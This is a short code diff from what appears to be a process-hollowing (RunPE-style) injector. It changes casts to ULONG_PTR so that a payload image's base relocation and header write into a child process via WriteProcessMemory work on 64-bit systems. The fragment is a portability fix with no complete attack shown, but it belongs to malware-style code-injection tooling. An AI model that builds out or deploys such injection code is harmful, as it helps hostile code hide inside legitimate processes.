@@ -224,9 +224,9 @@ int main() {
 
       destImageBase = newPayloadImageBase;
 
-      DWORD deltaImageBase = (DWORD)destImageBase - payloadImageNTHeaders->OptionalHeader.ImageBase;
+      ULONG_PTR deltaImageBase = (ULONG_PTR)destImageBase - payloadImageNTHeaders->OptionalHeader.ImageBase;
 
-      payloadImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
+      payloadImageNTHeaders->OptionalHeader.ImageBase = (ULONG_PTR)destImageBase;
       WriteProcessMemory(hChildProcess, newPayloadImageBase, (uint8_t*)exec, payloadImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
       // Pointer to the first section
